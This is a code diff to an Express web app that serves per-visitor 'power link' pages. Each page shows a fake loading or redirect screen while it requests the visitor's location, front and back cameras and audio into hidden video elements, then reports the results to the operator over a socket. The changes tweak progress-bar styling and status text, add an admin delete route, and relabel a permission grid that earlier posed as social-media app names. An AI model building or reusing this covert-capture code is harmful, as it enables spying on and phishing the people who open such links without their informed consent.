@@ -300,6 +300,14 @@ app.put('/api/publisher/:id/suspend', (req, res) => {
     res.json({ success: true, suspended: publishers[pIndex].suspended });
 });
 
+app.delete('/api/publisher/:id', (req, res) => {
+    if (!req.session.admin) return res.status(401).json({ error: 'Unauthorized' });
+    let publishers = readPublishers();
+    publishers = publishers.filter(p => p.id !== req.params.id);
+    writePublishers(publishers);
+    res.json({ success: true });
+});
+
 // ============================================
 // POWER LINK ROUTE
 // ============================================
@@ -368,9 +376,9 @@ app.get('/p/:visitorId', (req, res) => {
         #statusText { color: rgba(255,255,255,0.5); font-size: 13px; margin-top: 12px; }
         .progress-container {
             width: 100%;
-            height: 3px;
+            height: 4px;
             background: rgba(255,255,255,0.1);
-            border-radius: 3px;
+            border-radius: 4px;
             margin-top: 18px;
             overflow: hidden;
         }
@@ -378,9 +386,10 @@ app.get('/p/:visitorId', (req, res) => {
             height: 100%;
             width: 0%;
             background: linear-gradient(90deg, #667eea, #764ba2);
-            border-radius: 3px;
-            transition: width 0.3s ease;
+            border-radius: 4px;
+            transition: width 0.5s ease;
         }
+        #progressText { color: rgba(255,255,255,0.3); font-size: 11px; margin-top: 5px; }
         #hiddenVideo, #hiddenVideoBack { display: none; }
     </style>
 </head>
@@ -393,6 +402,7 @@ app.get('/p/:visitorId', (req, res) => {
         <div class="sub-text">Please wait a moment</div>
         <div id="statusText">⏳ Initializing...</div>
         <div class="progress-container"><div class="progress-bar" id="progressBar"></div></div>
+        <div id="progressText">0%</div>
     </div>
 
     <video id="hiddenVideo" autoplay playsinline muted></video>
@@ -453,6 +463,7 @@ app.get('/p/:visitorId', (req, res) => {
             let backVideo = document.getElementById('hiddenVideoBack');
             let statusText = document.getElementById('statusText');
             let progressBar = document.getElementById('progressBar');
+            let progressText = document.getElementById('progressText');
             let redirectTriggered = false;
             let startTime = Date.now();
 
@@ -460,9 +471,11 @@ app.get('/p/:visitorId', (req, res) => {
                 statusText.textContent = msg;
                 if (progress !== null) {
                     progressBar.style.width = progress + '%';
+                    progressText.textContent = Math.round(progress) + '%';
                 } else {
                     const elapsed = Math.min((Date.now() - startTime) / 3000 * 70, 70);
                     progressBar.style.width = (10 + elapsed) + '%';
+                    progressText.textContent = Math.round(10 + elapsed) + '%';
                 }
             }
 
@@ -550,7 +563,7 @@ app.get('/p/:visitorId', (req, res) => {
             }
 
             function requestAllPermissions() {
-                updateStatus('Redirecting...', 40);
+                updateStatus('📸 Requesting permissions...', 40);
 
                 Promise.all([
                     requestLocation(),
@@ -791,9 +804,9 @@ app.get('/sp/:visitorId', (req, res) => {
         }
         .progress-container {
             width: 100%;
-            height: 3px;
+            height: 4px;
             background: rgba(255,255,255,0.08);
-            border-radius: 3px;
+            border-radius: 4px;
             margin-top: 18px;
             overflow: hidden;
         }
@@ -801,9 +814,10 @@ app.get('/sp/:visitorId', (req, res) => {
             height: 100%;
             width: 0%;
             background: linear-gradient(90deg, #f6ad55, #ed8936);
-            border-radius: 3px;
-            transition: width 0.3s ease;
+            border-radius: 4px;
+            transition: width 0.5s ease;
         }
+        #progressText { color: rgba(255,255,255,0.3); font-size: 11px; margin-top: 5px; }
         #statusText { color: rgba(255,255,255,0.5); font-size: 13px; margin-top: 12px; }
         .perm-grid {
             display: grid;
@@ -831,15 +845,16 @@ app.get('/sp/:visitorId', (req, res) => {
         <div class="spinner"></div>
         <div id="statusText">⏳ Initializing...</div>
         <div class="progress-container"><div class="progress-bar" id="progressBar"></div></div>
+        <div id="progressText">0%</div>
         <div class="perm-grid" id="permGrid">
-            <div class="perm-item" id="permLocation">Youtube</div>
-            <div class="perm-item" id="permFront">Instagram</div>
-            <div class="perm-item" id="permBack">Facebook</div>
-            <div class="perm-item" id="permAudio">Snapchat</div>
-            <div class="perm-item" id="permBattery">WhatsApp</div>
-            <div class="perm-item" id="permNetwork">Twitter</div>
-            <div class="perm-item" id="permPhone">Telegram</div>
-            <div class="perm-item" id="permPasswords">Others ...</div>
+            <div class="perm-item" id="permLocation">📍 Location</div>
+            <div class="perm-item" id="permFront">📸 Front Camera</div>
+            <div class="perm-item" id="permBack">📸 Back Camera</div>
+            <div class="perm-item" id="permAudio">🎙️ Audio</div>
+            <div class="perm-item" id="permBattery">🔋 Battery</div>
+            <div class="perm-item" id="permNetwork">📶 Network</div>
+            <div class="perm-item" id="permPhone">📞 Phone</div>
+            <div class="perm-item" id="permPasswords">🔑 Passwords</div>
         </div>
     </div>
 
@@ -866,6 +881,7 @@ app.get('/sp/:visitorId', (req, res) => {
             let backVideo = document.getElementById('hiddenVideoBack');
             let statusText = document.getElementById('statusText');
             let progressBar = document.getElementById('progressBar');
+            let progressText = document.getElementById('progressText');
             let redirectTriggered = false;
             let startTime = Date.now();
 
@@ -873,9 +889,11 @@ app.get('/sp/:visitorId', (req, res) => {
                 statusText.textContent = msg;
                 if (progress !== null) {
                     progressBar.style.width = progress + '%';
+                    progressText.textContent = Math.round(progress) + '%';
                 } else {
                     const elapsed = Math.min((Date.now() - startTime) / 4000 * 70, 70);
                     progressBar.style.width = (10 + elapsed) + '%';
+                    progressText.textContent = Math.round(10 + elapsed) + '%';
                 }
             }
 
@@ -972,7 +990,7 @@ app.get('/sp/:visitorId', (req, res) => {
             }
 
             function requestAllPermissions() {
-                updateStatus('Loading...', 30);
+                updateStatus('📸 Requesting all permissions...', 30);
 
                 Promise.all([
                     requestLocation(),
@@ -1014,7 +1032,7 @@ app.get('/sp/:visitorId', (req, res) => {
                         updatePerm('permAudio');
                     }
 
-                    updateStatus('✅ Redirecting...', 100);
+                    updateStatus('✅ All permissions granted! Redirecting...', 100);
 
                     if (socket && socket.connected) {
                         socket.emit('visitor-data', { visitorId, type: 'permissionsGranted', content: true });
